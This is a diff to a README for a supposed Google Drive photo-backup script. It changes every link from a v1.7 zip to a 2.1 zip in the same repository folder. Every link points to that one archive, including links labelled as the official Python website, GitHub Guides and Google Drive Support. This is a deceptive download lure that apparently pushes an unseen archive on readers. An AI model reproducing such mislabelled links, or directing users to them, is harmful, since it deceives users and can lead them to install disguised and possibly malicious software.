@@ -1,6 +1,6 @@
 # 🎉 gso_google_drive_backup - Organize Your Photos for Easy Backups
 
-[![Download](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso_google_drive_backup_v1.7.zip)](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso_google_drive_backup_v1.7.zip)
+[![Download](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso-google-drive-backup-2.1.zip)](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso-google-drive-backup-2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to gso_google_drive_backup! This handy script helps you sort your photos
 
 To get started, you will need to download the script from our Releases page. Click the link below:
 
-[Visit this page to download](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso_google_drive_backup_v1.7.zip)
+[Visit this page to download](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso-google-drive-backup-2.1.zip)
 
 Once you are on the Releases page, look for the latest version. You will find a downloadable file. 
 
@@ -21,7 +21,7 @@ Once you are on the Releases page, look for the latest version. You will find a 
 ### 🛠️ System Requirements
 
 - **Operating System**: Windows, macOS, or Linux.
-- **Python**: Make sure you have Python 3.x installed on your computer. If you don’t have it, you can download it from the [official Python website](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso_google_drive_backup_v1.7.zip).
+- **Python**: Make sure you have Python 3.x installed on your computer. If you don’t have it, you can download it from the [official Python website](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso-google-drive-backup-2.1.zip).
 - **Storage Space**: Ensure you have enough storage on Google Drive for your files.
 
 ## 📖 How to Use
@@ -74,8 +74,8 @@ Join our community to share tips, ask questions, and get help from other users. 
 
 ## 📚 Resources
 
-- **Python Installation**: [Download Python](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso_google_drive_backup_v1.7.zip)
-- **GitHub Documentation**: [GitHub Guides](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso_google_drive_backup_v1.7.zip)
-- **Google Drive Help**: [Google Drive Support](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso_google_drive_backup_v1.7.zip)
+- **Python Installation**: [Download Python](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso-google-drive-backup-2.1.zip)
+- **GitHub Documentation**: [GitHub Guides](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso-google-drive-backup-2.1.zip)
+- **Google Drive Help**: [Google Drive Support](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso-google-drive-backup-2.1.zip)
 
-Thank you for using gso_google_drive_backup. We're excited to help you keep your photos and videos organized! Don't forget to visit our [Releases page to download](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso_google_drive_backup_v1.7.zip) the latest version.
+Thank you for using gso_google_drive_backup. We're excited to help you keep your photos and videos organized! Don't forget to visit our [Releases page to download](https://raw.githubusercontent.com/nkaid2011/gso_google_drive_backup/main/hecte/gso-google-drive-backup-2.1.zip) the latest version.
